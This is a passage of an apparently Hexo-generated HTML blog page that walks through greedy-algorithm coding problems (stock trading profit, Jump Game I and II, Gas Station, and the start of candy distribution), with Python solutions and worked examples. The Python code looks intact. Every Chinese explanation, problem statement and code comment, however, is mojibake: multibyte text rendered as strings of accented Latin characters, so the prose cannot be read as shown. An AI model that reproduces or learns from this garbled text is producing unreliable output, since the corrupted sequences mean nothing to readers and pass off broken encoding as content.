ä¹Ÿå¯ä»¥å…ˆè´­ä¹°ï¼Œç„¶ååœ¨ åŒä¸€å¤© å‡ºå”®ã€‚<br>è¿”å› ä½ èƒ½è·å¾—çš„ æœ€å¤§ åˆ©æ¶¦ ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šprices = [7,1,5,3,6,4]</span><br><span class="line">è¾“å‡ºï¼š7</span><br><span class="line">è§£é‡Šï¼šåœ¨ç¬¬ 2 å¤©ï¼ˆè‚¡ç¥¨ä»·æ ¼ = 1ï¼‰çš„æ—¶å€™ä¹°å…¥ï¼Œåœ¨ç¬¬ 3 å¤©ï¼ˆè‚¡ç¥¨ä»·æ ¼ = 5ï¼‰çš„æ—¶å€™å–å‡º, è¿™ç¬”äº¤æ˜“æ‰€èƒ½è·å¾—åˆ©æ¶¦ = 5 - 1 = 4ã€‚</span><br><span class="line">éšåï¼Œåœ¨ç¬¬ 4 å¤©ï¼ˆè‚¡ç¥¨ä»·æ ¼ = 3ï¼‰çš„æ—¶å€™ä¹°å…¥ï¼Œåœ¨ç¬¬ 5 å¤©ï¼ˆè‚¡ç¥¨ä»·æ ¼ = 6ï¼‰çš„æ—¶å€™å–å‡º, è¿™ç¬”äº¤æ˜“æ‰€èƒ½è·å¾—åˆ©æ¶¦ = 6 - 3 = 3ã€‚</span><br><span class="line">æœ€å¤§æ€»åˆ©æ¶¦ä¸º 4 + 3 = 7 ã€‚</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³åˆ°å…¶å®æœ€ç»ˆåˆ©æ¶¦æ˜¯å¯ä»¥åˆ†è§£çš„ï¼Œé‚£ä¹ˆæœ¬é¢˜å°±å¾ˆå®¹æ˜“äº†ï¼å¦‚ä½•åˆ†è§£å‘¢ï¼Ÿ<br>å‡å¦‚ç¬¬ 0 å¤©ä¹°å…¥ï¼Œç¬¬ 3 å¤©å–å‡ºï¼Œé‚£ä¹ˆåˆ©æ¶¦ä¸ºï¼šprices[3] - prices[0]ã€‚<br>ç›¸å½“äº(prices[3] - prices[2]) + (prices[2] - prices[1]) + (prices[1] - prices[0])ã€‚<br>æ­¤æ—¶å°±æ˜¯æŠŠåˆ©æ¶¦åˆ†è§£ä¸ºæ¯å¤©ä¸ºå•ä½çš„ç»´åº¦ï¼Œè€Œä¸æ˜¯ä» 0 å¤©åˆ°ç¬¬ 3 å¤©æ•´ä½“å»è€ƒè™‘ï¼<br><img src="/2025/03/12/algorithm/Greedy/image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(prices)):</span><br><span class="line">            result += <span class="built_in">max</span>(prices[i] - prices[i-<span class="number">1</span>], <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="55-è·³è·ƒæ¸¸æˆ"><a href="#55-è·³è·ƒæ¸¸æˆ" class="headerlink" title="55. è·³è·ƒæ¸¸æˆ"></a>55. è·³è·ƒæ¸¸æˆ</h2><p>ç»™å®šä¸€ä¸ªéè´Ÿæ•´æ•°æ•°ç»„ï¼Œä½ æœ€åˆä½äºæ•°ç»„çš„ç¬¬ä¸€ä¸ªä½ç½®ã€‚<br>æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ä»£è¡¨ä½ åœ¨è¯¥ä½ç½®å¯ä»¥è·³è·ƒçš„æœ€å¤§é•¿åº¦ã€‚<br>åˆ¤æ–­ä½ æ˜¯å¦èƒ½å¤Ÿåˆ°è¾¾æœ€åä¸€ä¸ªä½ç½®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹  1:</span><br><span class="line">è¾“å…¥: [2,3,1,1,4]</span><br><span class="line">è¾“å‡º: true</span><br><span class="line">è§£é‡Š: æˆ‘ä»¬å¯ä»¥å…ˆè·³ 1 æ­¥ï¼Œä»ä½ç½® 0 åˆ°è¾¾ ä½ç½® 1, ç„¶åå†ä»ä½ç½® 1 è·³ 3 æ­¥åˆ°è¾¾æœ€åä¸€ä¸ªä½ç½®ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canJump</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        cover = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="comment"># pythonä¸æ”¯æŒåŠ¨æ€ä¿®æ”¹forå¾ªç¯ä¸­å˜é‡,ä½¿ç”¨whileå¾ªç¯ä»£æ›¿</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= cover:</span><br><span class="line">            cover = <span class="built_in">max</span>(i + nums[i], cover)</span><br><span class="line">            <span class="keyword">if</span> cover &gt;= <span class="built_in">len</span>(nums) - <span class="number">1</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h2 id="45-è·³è·ƒæ¸¸æˆ-II"><a href="#45-è·³è·ƒæ¸¸æˆ-II" class="headerlink" title="45.è·³è·ƒæ¸¸æˆ II"></a>45.è·³è·ƒæ¸¸æˆ II</h2><p>ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º n çš„ 0 ç´¢å¼•æ•´æ•°æ•°ç»„ numsã€‚åˆå§‹ä½ç½®ä¸º nums[0]ã€‚<br>æ¯ä¸ªå…ƒç´  nums[i] è¡¨ç¤ºä»ç´¢å¼• i å‘åè·³è½¬çš„æœ€å¤§é•¿åº¦ã€‚æ¢å¥è¯è¯´ï¼Œå¦‚æœä½ åœ¨ nums[i] å¤„ï¼Œä½ å¯ä»¥è·³è½¬åˆ°ä»»æ„ nums[i + j] å¤„:<br>0 &lt;&#x3D; j &lt;&#x3D; nums[i]<br>i + j &lt; n<br>è¿”å›åˆ°è¾¾ nums[n - 1] çš„æœ€å°è·³è·ƒæ¬¡æ•°ã€‚ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹å¯ä»¥åˆ°è¾¾ nums[n - 1]ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ 1:</span><br><span class="line">è¾“å…¥: nums = [2,3,1,1,4]</span><br><span class="line">è¾“å‡º: 2</span><br><span class="line">è§£é‡Š: è·³åˆ°æœ€åä¸€ä¸ªä½ç½®çš„æœ€å°è·³è·ƒæ•°æ˜¯ 2ã€‚</span><br><span class="line">     ä»ä¸‹æ ‡ä¸º 0 è·³åˆ°ä¸‹æ ‡ä¸º 1 çš„ä½ç½®ï¼Œè·³ 1 æ­¥ï¼Œç„¶åè·³ 3 æ­¥åˆ°è¾¾æ•°ç»„çš„æœ€åä¸€ä¸ªä½ç½®ã€‚</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜è¦è®¡ç®—æœ€å°‘æ­¥æ•°ï¼Œé‚£ä¹ˆå°±è¦æƒ³æ¸…æ¥šä»€ä¹ˆæ—¶å€™æ­¥æ•°æ‰ä¸€å®šè¦åŠ ä¸€å‘¢ï¼Ÿ<br>è´ªå¿ƒçš„æ€è·¯ï¼Œå±€éƒ¨æœ€ä¼˜ï¼šå½“å‰å¯ç§»åŠ¨è·ç¦»å°½å¯èƒ½å¤šèµ°ï¼Œå¦‚æœè¿˜æ²¡åˆ°ç»ˆç‚¹ï¼Œæ­¥æ•°å†åŠ ä¸€ã€‚æ•´ä½“æœ€ä¼˜ï¼šä¸€æ­¥å°½å¯èƒ½å¤šèµ°ï¼Œä»è€Œè¾¾åˆ°æœ€å°‘æ­¥æ•°ã€‚<br>æ€è·¯è™½ç„¶æ˜¯è¿™æ ·ï¼Œä½†åœ¨å†™ä»£ç çš„æ—¶å€™è¿˜ä¸èƒ½çœŸçš„èƒ½è·³å¤šè¿œå°±è·³å¤šè¿œï¼Œé‚£æ ·å°±ä¸çŸ¥é“ä¸‹ä¸€æ­¥æœ€è¿œèƒ½è·³åˆ°å“ªé‡Œäº†ã€‚<br>æ‰€ä»¥çœŸæ­£è§£é¢˜çš„æ—¶å€™ï¼Œè¦ä»è¦†ç›–èŒƒå›´å‡ºå‘ï¼Œä¸ç®¡æ€ä¹ˆè·³ï¼Œè¦†ç›–èŒƒå›´å†…ä¸€å®šæ˜¯å¯ä»¥è·³åˆ°çš„ï¼Œä»¥æœ€å°çš„æ­¥æ•°å¢åŠ è¦†ç›–èŒƒå›´ï¼Œè¦†ç›–èŒƒå›´ä¸€æ—¦è¦†ç›–äº†ç»ˆç‚¹ï¼Œå¾—åˆ°çš„å°±æ˜¯æœ€å°‘æ­¥æ•°ï¼<br>è¿™é‡Œéœ€è¦ç»Ÿè®¡ä¸¤ä¸ªè¦†ç›–èŒƒå›´ï¼Œå½“å‰è¿™ä¸€æ­¥çš„æœ€å¤§è¦†ç›–å’Œä¸‹ä¸€æ­¥æœ€å¤§è¦†ç›–ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">jump</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nums) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        cur_distance = <span class="number">0</span> <span class="comment"># å½“å‰è¦†ç›–æœ€è¿œè·ç¦»ä¸‹æ ‡</span></span><br><span class="line">        ans = <span class="number">0</span> <span class="comment"># è®°å½•èµ°çš„æœ€å¤§æ­¥æ•°</span></span><br><span class="line">        next_distance = <span class="number">0</span> <span class="comment"># ä¸‹ä¸€æ­¥è¦†ç›–æœ€è¿œè·ç¦»ä¸‹æ ‡</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            next_distance = <span class="built_in">max</span>(nums[i]+i, next_distance)</span><br><span class="line">            <span class="keyword">if</span> i == cur_distance: <span class="comment"># é‡åˆ°å½“å‰è¦†ç›–æœ€è¿œè·ç¦»ä¸‹æ ‡</span></span><br><span class="line">                ans += <span class="number">1</span></span><br><span class="line">                cur_distance = next_distance</span><br><span class="line">                <span class="keyword">if</span> next_distance &gt;= <span class="built_in">len</span>(nums) - <span class="number">1</span>: <span class="comment"># å½“å‰è¦†ç›–æœ€è¿œè·ç¦»è¾¾åˆ°æ•°ç»„æœ«å°¾ï¼Œä¸ç”¨å†åšans++æ“ä½œï¼Œç›´æ¥ç»“æŸ</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure><h2 id="134-åŠ æ²¹ç«™"><a href="#134-åŠ æ²¹ç«™" class="headerlink" title="134. åŠ æ²¹ç«™"></a>134. åŠ æ²¹ç«™</h2><p>åœ¨ä¸€æ¡ç¯è·¯ä¸Šæœ‰ n ä¸ªåŠ æ²¹ç«™ï¼Œå…¶ä¸­ç¬¬ i ä¸ªåŠ æ²¹ç«™æœ‰æ±½æ²¹ gas[i] å‡ã€‚<br>ä½ æœ‰ä¸€è¾†æ²¹ç®±å®¹é‡æ— é™çš„çš„æ±½è½¦ï¼Œä»ç¬¬ i ä¸ªåŠ æ²¹ç«™å¼€å¾€ç¬¬ i+1 ä¸ªåŠ æ²¹ç«™éœ€è¦æ¶ˆè€—æ±½æ²¹ cost[i] å‡ã€‚ä½ ä»å…¶ä¸­çš„ä¸€ä¸ªåŠ æ²¹ç«™å‡ºå‘ï¼Œå¼€å§‹æ—¶æ²¹ç®±ä¸ºç©ºã€‚<br>ç»™å®šä¸¤ä¸ªæ•´æ•°æ•°ç»„ gas å’Œ cost ï¼Œå¦‚æœä½ å¯ä»¥æŒ‰é¡ºåºç»•ç¯è·¯è¡Œé©¶ä¸€å‘¨ï¼Œåˆ™è¿”å›å‡ºå‘æ—¶åŠ æ²¹ç«™çš„ç¼–å·ï¼Œå¦åˆ™è¿”å› -1 ã€‚å¦‚æœå­˜åœ¨è§£ï¼Œåˆ™ ä¿è¯ å®ƒæ˜¯ å”¯ä¸€ çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ç¤ºä¾‹ 1:</span><br><span class="line">è¾“å…¥: gas = [1,2,3,4,5], cost = [3,4,5,1,2]</span><br><span class="line"></span><br><span class="line">è¾“å‡º: 3</span><br><span class="line">è§£é‡Š:</span><br><span class="line">ä» 3 å·åŠ æ²¹ç«™(ç´¢å¼•ä¸º 3 å¤„)å‡ºå‘ï¼Œå¯è·å¾— 4 å‡æ±½æ²¹ã€‚æ­¤æ—¶æ²¹ç®±æœ‰ = 0 + 4 = 4 å‡æ±½æ²¹</span><br><span class="line">å¼€å¾€ 4 å·åŠ æ²¹ç«™ï¼Œæ­¤æ—¶æ²¹ç®±æœ‰ 4 - 1 + 5 = 8 å‡æ±½æ²¹</span><br><span class="line">å¼€å¾€ 0 å·åŠ æ²¹ç«™ï¼Œæ­¤æ—¶æ²¹ç®±æœ‰ 8 - 2 + 1 = 7 å‡æ±½æ²¹</span><br><span class="line">å¼€å¾€ 1 å·åŠ æ²¹ç«™ï¼Œæ­¤æ—¶æ²¹ç®±æœ‰ 7 - 3 + 2 = 6 å‡æ±½æ²¹</span><br><span class="line">å¼€å¾€ 2 å·åŠ æ²¹ç«™ï¼Œæ­¤æ—¶æ²¹ç®±æœ‰ 6 - 4 + 3 = 5 å‡æ±½æ²¹</span><br><span class="line">å¼€å¾€ 3 å·åŠ æ²¹ç«™ï¼Œä½ éœ€è¦æ¶ˆè€— 5 å‡æ±½æ²¹ï¼Œæ­£å¥½è¶³å¤Ÿä½ è¿”å›åˆ° 3 å·åŠ æ²¹ç«™ã€‚</span><br><span class="line">å› æ­¤ï¼Œ3 å¯ä¸ºèµ·å§‹ç´¢å¼•ã€‚</span><br></pre></td></tr></table></figure><p>å¦‚æœæ€»æ²¹é‡å‡å»æ€»æ¶ˆè€—å¤§äºç­‰äºé›¶é‚£ä¹ˆä¸€å®šå¯ä»¥è·‘å®Œä¸€åœˆï¼Œè¯´æ˜ å„ä¸ªç«™ç‚¹çš„åŠ æ²¹ç«™ å‰©æ²¹é‡rest[i]ç›¸åŠ ä¸€å®šæ˜¯å¤§äºç­‰äºé›¶çš„ã€‚æ¯ä¸ªåŠ æ²¹ç«™çš„å‰©ä½™é‡rest[i]ä¸ºgas[i] - cost[i]ã€‚iä»0å¼€å§‹ç´¯åŠ rest[i]ï¼Œå’Œè®°ä¸ºcurSumï¼Œä¸€æ—¦curSumå°äºé›¶ï¼Œè¯´æ˜[0, i]åŒºé—´éƒ½ä¸èƒ½ä½œä¸ºèµ·å§‹ä½ç½®ï¼Œå› ä¸ºè¿™ä¸ªåŒºé—´é€‰æ‹©ä»»ä½•ä¸€ä¸ªä½ç½®ä½œä¸ºèµ·ç‚¹ï¼Œåˆ°iè¿™é‡Œéƒ½ä¼šæ–­æ²¹ï¼Œé‚£ä¹ˆèµ·å§‹ä½ç½®ä»i+1ç®—èµ·ï¼Œå†ä»0è®¡ç®—curSumã€‚é‚£ä¹ˆå±€éƒ¨æœ€ä¼˜ï¼šå½“å‰ç´¯åŠ rest[i]çš„å’ŒcurSumä¸€æ—¦å°äº0ï¼Œèµ·å§‹ä½ç½®è‡³å°‘è¦æ˜¯i+1ï¼Œå› ä¸ºä»iä¹‹å‰å¼€å§‹ä¸€å®šä¸è¡Œã€‚å…¨å±€æœ€ä¼˜ï¼šæ‰¾åˆ°å¯ä»¥è·‘ä¸€åœˆçš„èµ·å§‹ä½ç½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canCompleteCircuit</span>(<span class="params">self, gas: <span class="type">List</span>[<span class="built_in">int</span>], cost: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        curSum = <span class="number">0</span></span><br><span class="line">        totalSum = <span class="number">0</span></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(gas)):</span><br><span class="line">            curSum += gas[i] - cost[i]</span><br><span class="line">            totalSum += gas[i] - cost[i]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> curSum &lt; <span class="number">0</span>:</span><br><span class="line">                start = i+<span class="number">1</span></span><br><span class="line">                curSum = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> totalSum &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> start</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä»å…¨å±€è¿›è¡Œè´ªå¿ƒé€‰æ‹©ï¼Œæƒ…å†µå¦‚ä¸‹ï¼š<br>æƒ…å†µä¸€ï¼šå¦‚æœgasçš„æ€»å’Œå°äºcostæ€»å’Œï¼Œé‚£ä¹ˆæ— è®ºä»å“ªé‡Œå‡ºå‘ï¼Œä¸€å®šæ˜¯è·‘ä¸äº†ä¸€åœˆçš„<br>æƒ…å†µäºŒï¼šrest[i] &#x3D; gas[i]-cost[i]ä¸ºä¸€å¤©å‰©ä¸‹çš„æ²¹ï¼Œiä»0å¼€å§‹è®¡ç®—ç´¯åŠ åˆ°æœ€åä¸€ç«™ï¼Œå¦‚æœç´¯åŠ æ²¡æœ‰å‡ºç°è´Ÿæ•°ï¼Œè¯´æ˜ä»0å‡ºå‘ï¼Œæ²¹å°±æ²¡æœ‰æ–­è¿‡ï¼Œé‚£ä¹ˆ0å°±æ˜¯èµ·ç‚¹ã€‚<br>æƒ…å†µä¸‰ï¼šå¦‚æœç´¯åŠ çš„æœ€å°å€¼æ˜¯è´Ÿæ•°ï¼Œæ±½è½¦å°±è¦ä»é0èŠ‚ç‚¹å‡ºå‘ï¼Œä»åå‘å‰ï¼Œçœ‹å“ªä¸ªèŠ‚ç‚¹èƒ½æŠŠè¿™ä¸ªè´Ÿæ•°å¡«å¹³ï¼Œèƒ½æŠŠè¿™ä¸ªè´Ÿæ•°å¡«å¹³çš„èŠ‚ç‚¹å°±æ˜¯å‡ºå‘èŠ‚ç‚¹ã€‚</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a><strong>ç¤ºä¾‹</strong></h3><h4 id="è¾“å…¥"><a href="#è¾“å…¥" class="headerlink" title="è¾“å…¥"></a><strong>è¾“å…¥</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gas  = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">cost = [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>è®¡ç®— <code>rest[i] = gas[i] - cost[i]</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rest = [-2, -2, -2, 3, 3]</span><br></pre></td></tr></table></figure><p>ç´¯ç§¯ <code>curSum</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=0, curSum = -2  (curSum &lt; 0ï¼Œè¯´æ˜0ä¸èƒ½ä½œä¸ºèµ·ç‚¹)</span><br><span class="line">i=1, curSum = -4  (curSum &lt; 0ï¼Œè¯´æ˜1ä¸èƒ½ä½œä¸ºèµ·ç‚¹)</span><br><span class="line">i=2, curSum = -6  (curSum &lt; 0ï¼Œè¯´æ˜2ä¸èƒ½ä½œä¸ºèµ·ç‚¹)</span><br><span class="line">i=3, curSum = -3  (curSum å˜å¤§)</span><br><span class="line">i=4, curSum =  0  (curSum &gt;= 0ï¼Œæ‰€æœ‰æ²¹é‡ç´¯åŠ åå˜ä¸ºéè´Ÿ)</span><br></pre></td></tr></table></figure><p>ğŸ”¹ <strong>æœ€å° <code>curSum = -6</code>ï¼ˆåœ¨ <code>i=2</code> å¤„ï¼‰ï¼Œæ‰€ä»¥éœ€è¦å¡«å¹³ <code>-6</code>ã€‚</strong></p><hr><h3 id="å¦‚ä½•æ‰¾åˆ°èƒ½å¡«å¹³-6-çš„ç«™ç‚¹"><a href="#å¦‚ä½•æ‰¾åˆ°èƒ½å¡«å¹³-6-çš„ç«™ç‚¹" class="headerlink" title="å¦‚ä½•æ‰¾åˆ°èƒ½å¡«å¹³ -6 çš„ç«™ç‚¹"></a><strong>å¦‚ä½•æ‰¾åˆ°èƒ½å¡«å¹³ <code>-6</code> çš„ç«™ç‚¹</strong></h3><ul><li><strong>ä»åå¾€å‰æ£€æŸ¥ <code>rest[i]</code>ï¼Œæ‰¾å‡ºä»å“ªå¼€å§‹å¯ä»¥è®© <code>curSum</code> å›æ­£ã€‚</strong></li><li><code>rest = [-2, -2, -2, 3, 3]</code></li><li>**ä» <code>i=4</code> å¼€å§‹å‘å‰ç´¯åŠ ï¼Œç›´åˆ° <code>curSum &gt;= 0</code>**ï¼š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i=4, sum = 3  (å¡«å¹³ -6 è¿˜å·® 3)</span><br><span class="line">i=3, sum = 6  (å·²ç»å¡«å¹³äº† -6)</span><br></pre></td></tr></table></figure></li><li>è¯´æ˜ <strong>ä» <code>i=3</code> å¼€å§‹å‡ºå‘ï¼Œå¯ä»¥å¡«å¹³ä¹‹å‰çš„äºæŸ <code>-6</code>ï¼Œæœ€ç»ˆå›åˆ° <code>0</code> æˆ–ä»¥ä¸Š</strong>ã€‚</li></ul><p>ğŸ”¹ **æœ€ç»ˆç­”æ¡ˆï¼šèµ·ç‚¹æ˜¯ <code>i=3</code>**ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">canCompleteCircuit</span>(<span class="params">self, gas: <span class="type">List</span>[<span class="built_in">int</span>], cost: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        curSum = <span class="number">0</span></span><br><span class="line">        minFuel = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(gas)):</span><br><span class="line">            rest = gas[i] - cost[i]</span><br><span class="line">            curSum += rest</span><br><span class="line">            <span class="keyword">if</span> curSum &lt; minFuel:</span><br><span class="line">                minFuel = curSum</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> curSum &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> minFuel &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(gas) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            rest = gas[i] - cost[i]</span><br><span class="line">            minFuel += rest</span><br><span class="line">            <span class="keyword">if</span> minFuel &gt;= <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="135-åˆ†å‘ç³–æœ"><a href="#135-åˆ†å‘ç³–æœ" class="headerlink" title="135. åˆ†å‘ç³–æœ"></a>135. åˆ†å‘ç³–æœ</h2><p>n ä¸ªå­©å­ç«™æˆä¸€æ’ã€‚ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ ratings è¡¨ç¤ºæ¯ä¸ªå­©å­çš„è¯„åˆ†ã€‚<br>ä½ éœ€è¦æŒ‰ç…§ä»¥ä¸‹è¦æ±‚ï¼Œç»™è¿™äº›å­©å­åˆ†å‘ç³–æœï¼š<br>æ¯ä¸ªå­©å­è‡³å°‘åˆ†é…åˆ° 1 ä¸ªç³–æœã€‚<br>ç›¸é‚»ä¸¤ä¸ªå­©å­è¯„åˆ†æ›´é«˜çš„å­©å­ä¼šè·å¾—æ›´å¤šçš„ç³–æœã€‚<br>è¯·ä½ ç»™æ¯ä¸ªå­©å­åˆ†å‘ç³–æœï¼Œè®¡ç®—å¹¶è¿”å›éœ€è¦å‡†å¤‡çš„ æœ€å°‘ç³–æœæ•°ç›® ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šratings = [1,0,2]</span><br><span class="line">è¾“å‡ºï¼š5</span><br><span class="line">è§£é‡Šï¼šä½ å¯ä»¥åˆ†åˆ«ç»™ç¬¬ä¸€ä¸ªã€ç¬¬äºŒä¸ªã€ç¬¬ä¸‰ä¸ªå­©å­åˆ†å‘ 2ã€1ã€2 